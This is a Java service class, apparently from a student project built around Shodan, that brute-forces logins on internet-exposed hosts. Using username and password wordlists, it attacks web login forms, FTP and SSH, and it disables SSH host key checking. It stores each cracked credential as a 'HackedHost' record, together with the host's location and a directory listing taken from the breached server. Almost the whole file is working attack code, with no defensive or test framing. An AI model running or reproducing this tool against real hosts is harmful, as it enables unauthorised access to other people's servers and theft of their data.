package com.uah.shodan_tfg.core.services.impl;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpClient.Redirect;
import java.net.http.HttpClient.Version;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicBoolean;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;
import org.apache.commons.net.ftp.FTPReply;
import org.jboss.logging.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.AsyncResult;
import org.springframework.stereotype.Service;

import com.gargoylesoftware.htmlunit.BrowserVersion;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlButtonInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;
import com.uah.shodan_tfg.core.services.IConnectionService;
import com.uah.shodan_tfg.core.util.IFileService;
import com.uah.shodan_tfg.dataproviders.dao.HackedHost;
import com.uah.shodan_tfg.dataproviders.dao.Host;
import com.uah.shodan_tfg.dataproviders.repositories.HackedHostRepository;
import com.uah.shodan_tfg.entrypoints.MessageLoggingController;

import net.schmizz.sshj.SSHClient;
import net.schmizz.sshj.sftp.SFTPClient;
import net.schmizz.sshj.transport.verification.PromiscuousVerifier;
import net.schmizz.sshj.userauth.UserAuthException;

@Service
public class ConnectionService implements IConnectionService {

	private static Logger LOGGER = Logger.getLogger(ConnectionService.class);

	private final String[] commonUsernames = {"root", "admin", "oracle", "test",
			"administrator", "guest", "mysql", "user", "info", "apache"};

	private AtomicBoolean running = new AtomicBoolean(false);

	private String finalResult;

	@Autowired
	IFileService fileService;

	@Autowired
	MessageLoggingController messageController;

	@Autowired
	HackedHostRepository hackedHostRepository;

	private HttpClient createHttpClient() {
		HttpClient client = HttpClient.newBuilder().version(Version.HTTP_2)
				.followRedirects(Redirect.NORMAL)
				.connectTimeout(Duration.ofSeconds(20))// .authenticator(Authenticator.getDefault())
				.build();
		return client;
	}

	@Override
	public String makeHttpRequest(Host host) {
		String body = null;
		HttpClient client = createHttpClient();
		HttpRequest request = HttpRequest.newBuilder().GET()
				.uri(URI.create(
						"http://" + host.getIp() + ":" + host.getPort()))
				.setHeader("User-Agent", "Java 11 HttpClient Bot") // add
																	// request
																	// header
				.build();
		try {
			// HttpResponse<String> response = client.send(request,
			// HttpResponse.BodyHandlers.ofString());

			var future = client.sendAsync(request,
					HttpResponse.BodyHandlers.ofString());
			body = future.thenApply(HttpResponse::body).get();
			System.out.println(body);
			messageController.send(body);
		} catch (InterruptedException e) {
			LOGGER.error(e.getMessage(), e);
		} catch (ExecutionException e) {
			LOGGER.error(e.getMessage(), e);
		}
		return body;
	}

	@Override
	@Async
	public Future<String> webAuthLogin(Host host, List<String> wordlists)
			throws InterruptedException {
		String result = "";
		finalResult = "";
		List<String> userWordlist = fileService
				.fileToList("wordlists/" + wordlists.get(0));
		List<String> passWordlist = fileService
				.fileToList("wordlists/" + wordlists.get(1));
		String ip = host.getIp();
		Integer port = host.getPort();

		if (running.compareAndSet(false, true)) {
			final WebClient webClient = new WebClient(BrowserVersion.FIREFOX);
			String protocol = "http://";
			if (host.getPort() == 443) {
				protocol = "https://";
			}
			webClient.getOptions().setUseInsecureSSL(true);
			HtmlPage page;
			System.out.println("IP --> " + ip + " | Port: " + port);
			messageController.send("IP --> " + ip + " | Port: " + port);
			try {

				for (String user : userWordlist) {
					for (String pass : passWordlist) {
						if (Thread.currentThread().isInterrupted()) {
							System.out.println("Interrupted");
							running.set(false);
							return new AsyncResult<String>(finalResult);
						}
						String baseUrl = protocol + host.getIp() + ":"
								+ host.getPort();
						String url = protocol + user + ":" + pass + "@"
								+ host.getIp() + ":" + host.getPort();
						try {
							System.out.println("Credentials tested --> User: "
									+ user + " | Password: " + pass);
							messageController
									.send("Credentials tested --> User: " + user
											+ " | Password: " + pass);
							page = webClient.getPage(url);
							if (!page.getUrl().toString().equals(baseUrl)) {
								result = "Correct login credentials --> User: "
										+ user + " | Password: " + pass;
								System.out.println(result);
								messageController.send(result);
								finalResult = ip + "|" + user + "|" + pass + "|"
										+ port;
								HackedHost hackedHost = hackedHostRepository
										.findByIpAndPort(ip, host.getPort());
								if (hackedHost == null) {
									hackedHost = new HackedHost(null, ip, user,
											pass, host.getPort(),
											host.getLocation().getCountry(),
											host.getLocation().getCity(),
											finalResult);
								} else {
									hackedHost.setUser(user);
									hackedHost.setPassword(pass);
								}
								hackedHostRepository.save(hackedHost);
								running.set(false);
								return new AsyncResult<String>(finalResult);
							}
						} catch (Exception e) {

						}
						HtmlPage page2 = null;
						try {
							page = webClient.getPage(protocol + host.getIp()
									+ ":" + host.getPort());

							// final List<HtmlForm> forms = page.getForms();

							// if(!forms.isEmpty()) {
							// final HtmlForm form = page.getForms().get(0);
							// }

							final HtmlTextInput userField = (HtmlTextInput) page
									.getByXPath(
											"//input[contains(@name, 'user') or contains(@id, 'usr') or contains(@name, 'username') or contains(@name, 'userName') or contains(@name, 'login') or contains(@ng-model, 'user')]")
									.get(0);
							final HtmlPasswordInput passField = (HtmlPasswordInput) page
									.getByXPath(
											"//input[contains(@type, 'password')]")
									.get(0);

							System.out.println("Credentials tested --> User: "
									+ user + " | Password: " + pass);
							messageController
									.send("Credentials tested --> User: " + user
											+ " | Password: " + pass);

							userField.type(user);
							passField.type(pass);

							final HtmlSubmitInput button;
							final HtmlButton backupButton;
							final HtmlButtonInput backupButton2;

							try {
								button = (HtmlSubmitInput) page.getByXPath(
										"//input[contains(@type, 'submit') or contains(@name, 'Login')]")
										.get(0);
								page2 = button.click();
							} catch (Exception ex) {
								try {
									backupButton = (HtmlButton) page.getByXPath(
											"//button[contains(@type, 'submit') or contains(@id, 'submit') or contains(@id, 'Login')]")
											.get(0);
									page2 = backupButton.click();
								} catch (Exception ex2) {
									try {
										backupButton2 = (HtmlButtonInput) page
												.getByXPath(
														"//input[contains(@type, 'button') or contains(@id, 'submit') or contains(@id, 'Login')]")
												.get(0);
										page2 = backupButton2.click();
									} catch (Exception ex3) {
										LOGGER.error(ex3.getMessage(), ex3);
										page2 = null;
									}
								}

							}
						} catch (Exception e) {

						}

						if (page2 != null && page2
								.getByXPath(
										"//input[contains(@type, 'password')]")
								.isEmpty()) {
							result = "Correct login credentials --> User: "
									+ user + " | Password: " + pass;
							System.out.println(result);
							messageController.send(result);
							finalResult = ip + "|" + user + "|" + pass + "|"
									+ port;
							HackedHost hackedHost = hackedHostRepository
									.findByIpAndPort(ip, host.getPort());
							if (hackedHost == null) {
								hackedHost = new HackedHost(null, ip, user,
										pass, host.getPort(),
										host.getLocation().getCountry(),
										host.getLocation().getCity(),
										finalResult);
							} else {
								hackedHost.setUser(user);
								hackedHost.setPassword(pass);
							}
							hackedHostRepository.save(hackedHost);
							running.set(false);
							return new AsyncResult<String>(finalResult);
						} else {
							System.out.println("Incorrect login credentials");
							messageController
									.send("Incorrect login credentials");
						}
					}
				}
			} catch (Exception e) {
				LOGGER.error(e.getMessage(), e);
				messageController.send("Login attempts for IP " + ip
						+ " failed: webpage is not a login site");
				running.set(false);
				return new AsyncResult<String>(finalResult);
			}
		}
		System.out.println(
				"Login attempts for IP " + ip + " were not successfull");
		messageController
				.send("Login attempts for IP " + ip + " were not successfull");
		return new AsyncResult<String>(finalResult);

	}

	@Override
	@Async
	public Future<String> connectToFtpServer(Host host, List<String> wordlists)
			throws InterruptedException {
		String result = "";
		finalResult = "";
		List<String> userWordlist = fileService
				.fileToList("wordlists/" + wordlists.get(0));
		List<String> passWordlist = fileService
				.fileToList("wordlists/" + wordlists.get(1));
		String username = "";
		String password = "";
		String ip = host.getIp();
		Integer port = host.getPort();

		FTPClient ftpClient = new FTPClient();
		try {
			ftpClient.connect(ip, port);
			result = ftpClient.getReplyString();
			System.out.println("FTP Server connection response --> " + result);
			messageController
					.send("FTP Server connection response --> " + result);
			Integer replyCode = ftpClient.getReplyCode();
			if (FTPReply.isNegativeTransient(replyCode)) {
				System.out.println(
						"ERROR - FTP Server response --> " + replyCode);
				messageController
						.send("ERROR - FTP Server response --> " + replyCode);
			} else if (FTPReply.isPositiveCompletion(replyCode)) {
				System.out.println("IP--> " + ip);
				messageController.send("IP--> " + ip);
				Integer counter = 0;
				if (running.compareAndSet(false, true)) {
					for (String user : userWordlist) {
						for (String pass : passWordlist) {
							if (Thread.currentThread().isInterrupted()) {
								System.out.println("Interrupted");
								running.set(false);
								return new AsyncResult<String>(finalResult);
							}
							if (counter == 3) {
								ftpClient.disconnect();
								ftpClient.connect(ip, port);
								counter = 0;
							}
							username = user;
							password = pass;
							System.out.println("Credentials tested --> User: "
									+ username + " | Password: " + password);
							messageController.send(
									"Credentials tested --> User: " + username
											+ " | Password: " + password);
							try {
								Boolean loggedIn = ftpClient.login(username,
										password);
								// Store login credentials
								if (loggedIn) {
									result = "Correct login credentials --> User: "
											+ username + " | Password: "
											+ password;
									System.out.println(result);
									messageController.send(result);
									result = ftpClient.getReplyString();
									System.out.println(
											"FTP Server login response --> "
													+ result);
									messageController.send(
											"FTP Server login response --> "
													+ result);
									ftpClient.enterLocalPassiveMode();
									String foldersTree = "\n{IP: " + ip
											+ " | PORT: " + port + " | USER: "
											+ username + " | PASS: " + password
											+ "}\n" + generateFTPTree(ftpClient,
													"", "/", 0, "");
									HackedHost hackedHost = hackedHostRepository
											.findByIpAndPort(ip, 21);
									if (hackedHost == null) {
										hackedHost = new HackedHost(null, ip,
												username, password, 21,
												host.getLocation().getCountry(),
												host.getLocation().getCity(),
												foldersTree);
									} else {
										hackedHost.setUser(username);
										hackedHost.setPassword(password);
									}
									finalResult = foldersTree;
									hackedHostRepository.save(hackedHost);
									running.set(false);
									return new AsyncResult<String>(finalResult);
								} else {
									System.out.println(
											"Incorrect login credentials");
									messageController.send(
											"Incorrect login credentials");
									counter += 1;
								}
							} catch (IOException e) {
								System.out.println(
										"Incorrect login credentials --> " + e);
								messageController.send(
										"Incorrect login credentials --> " + e);
								ftpClient.disconnect();
								ftpClient.connect(ip, port);
								continue;
							}
						}
					}
				}
				// result = ftpClient.getReplyString();
				// System.out.println("FTP Server login response --> " +
				// result);
				// messageController.send("FTP Server login response --> " +
				// result);
				// ftpClient.enterLocalPassiveMode();
				// FTPFile[] directories = ftpClient.listDirectories();
				// System.out.println("SUCCESS - FPT Directories --> " +
				// directories.toString());
				// messageController.send("SUCCESS - FPT Directories --> " +
				// directories.toString());
				// FTPFile[] files = ftpClient.listFiles();
				// System.out.println("SUCCESS - FTP Files--> " +
				// files.toString());
				// messageController.send("SUCCESS - FTP Files--> " +
				// files.toString());
			} else if (FTPReply.isPositiveIntermediate(replyCode)) {
				System.out.println("SUCCESS - May need login --> " + replyCode);
				messageController
						.send("SUCCESS - May need login --> " + replyCode);
				ftpClient.login(username, password);
				result = ftpClient.getReplyString();
				System.out.println("FTP Server login response --> " + result);
				messageController
						.send("FTP Server login response --> " + result);
			}
		} catch (IOException e) {
			LOGGER.error(e.getMessage(), e);
		}
		return new AsyncResult<String>(finalResult);
	}

	private String generateFTPTree(FTPClient ftpClient, String currentDirectory,
			String parentDirectory, Integer deep, String result)
			throws IOException {
		String nextDir = parentDirectory;
		if (!currentDirectory.equals("")) {
			nextDir += "/" + currentDirectory;
		}
		FTPFile[] files = ftpClient.listFiles(nextDir);
		if (files != null && files.length > 0) {
			for (FTPFile file : files) {
				String fileName = file.getName();
				if (fileName.equals(".") || fileName.equals("..")) {
					continue;
				}
				for (int i = 0; i < deep; i++) {
					System.out.print("\t");
					result += "\t";
				}
				if (file.isDirectory()) {
					System.out.println("\\-->" + fileName);
					result += "\\-->" + fileName + "\n";
					// result = generateFTPTree(ftpClient, nextDir, fileName,
					// deep + 1, result);
				} else {
					System.out.println(fileName);
					result += fileName + "\n";
				}
			}
		}
		return result;
	}

	@Override
	@Async
	public Future<String> connectThroughSSH(Host host, List<String> wordlists) {
		String ip = host.getIp();
		List<String> userWordlist = fileService
				.fileToList("wordlists/" + wordlists.get(0));
		List<String> passWordlist = fileService
				.fileToList("wordlists/" + wordlists.get(1));
		String username = "";
		String password = "";
		if (running.compareAndSet(false, true)) {
			for (String user : userWordlist) {
				for (String pass : passWordlist) {
					if (Thread.currentThread().isInterrupted()) {
						System.out.println("Interrupted");
						running.set(false);
						return new AsyncResult<String>(finalResult);
					}
					SSHClient clientSSH = new SSHClient();
					clientSSH.addHostKeyVerifier(new PromiscuousVerifier());
					username = user;
					password = pass;
					try {
						clientSSH.connect(ip);
						System.out.println("Credentials tested --> User: "
								+ username + " | Password: " + password);
						messageController.send("Credentials tested --> User: "
								+ username + " | Password: " + password);
						clientSSH.authPassword(username, password);
						// Store login credentials
						if (clientSSH.isConnected()
								&& clientSSH.isAuthenticated()) {
							System.out.println(
									"Correct login credentials --> User: "
											+ username + " | Password: "
											+ password);
							messageController
									.send("Correct login credentials --> User: "
											+ username + " | Password: "
											+ password);
							SFTPClient clientSFTP = clientSSH.newSFTPClient();
							String foldersTree = clientSFTP.ls("/").toString();
							clientSSH.disconnect();
							HackedHost hackedHost = hackedHostRepository
									.findByIpAndPort(ip, 22);
							if (hackedHost == null) {
								hackedHost = new HackedHost(null, ip, username,
										password, 22,
										host.getLocation().getCountry(),
										host.getLocation().getCity(),
										foldersTree);
							} else {
								hackedHost.setUser(username);
								hackedHost.setPassword(password);
							}
							finalResult = ip + "|" + user + "|" + pass + "|"
									+ 22;
							hackedHostRepository.save(hackedHost);
							running.set(false);
							return new AsyncResult<String>(finalResult);
						} else {
							System.out.println("Incorrect login credentials");
							messageController
									.send("Incorrect login credentials");
						}
					} catch (UserAuthException uae) {
						System.out.println(
								"Incorrect login credentials --> " + uae);
						messageController
								.send("Incorrect login credentials --> " + uae);
						try {
							clientSSH.disconnect();
						} catch (IOException e) {
							LOGGER.error(e.getMessage(), e);
						}
						continue;
					} catch (IOException e) {
						LOGGER.error(e.getMessage(), e);
					} catch (IllegalThreadStateException e) {
						LOGGER.error(e.getMessage(), e);
					} finally {
						try {
							clientSSH.disconnect();
						} catch (IOException e) {
							LOGGER.error(e.getMessage(), e);
						}
					}
				}
			}
		}
		return new AsyncResult<String>(finalResult);

	}

	@Override
	public String connectThroughTelnet(Host host, List<String> wordlists) {
		// TODO Auto-generated method stub
		return null;
	}

	// public void testSecurity(Integer id, String ip, Integer port) {
	// try {
	// URL url = new URL(ip + ":" + port);
	// HttpURLConnection con = (HttpURLConnection) url.openConnection();
	// con.setRequestMethod("GET");
	// con.setRequestProperty("Content-Type", "application/json");
	// String contentType = con.getHeaderField("Content-Type");
	// con.setConnectTimeout(5000);
	// con.setReadTimeout(5000);
	// int status = con.getResponseCode();
	// if (status == HttpURLConnection.HTTP_MOVED_TEMP || status ==
	// HttpURLConnection.HTTP_MOVED_PERM) {
	// String location = con.getHeaderField("Location");
	// URL newUrl = new URL(location);
	// con = (HttpURLConnection) newUrl.openConnection();
	// }
	// BufferedReader in = new BufferedReader(new
	// InputStreamReader(con.getInputStream()));
	// String inputLine;
	// StringBuffer content = new StringBuffer();
	// while ((inputLine = in.readLine()) != null) {
	// content.append(inputLine);
	// }
	// in.close();
	// con.disconnect();
	//
	// System.out.println("Llamada realizada");
	// } catch (MalformedURLException e2) {
	// // TODO Auto-generated catch block
	// e2.printStackTrace();
	// } catch (ProtocolException e) {
	// // TODO Auto-generated catch block
	// LOGGER.error(e.getMessage(), e);
	// } catch (IOException e1) {
	// // TODO Auto-generated catch block
	// e1.printStackTrace();
	// }
	// System.out.println();
	//
	// }

}
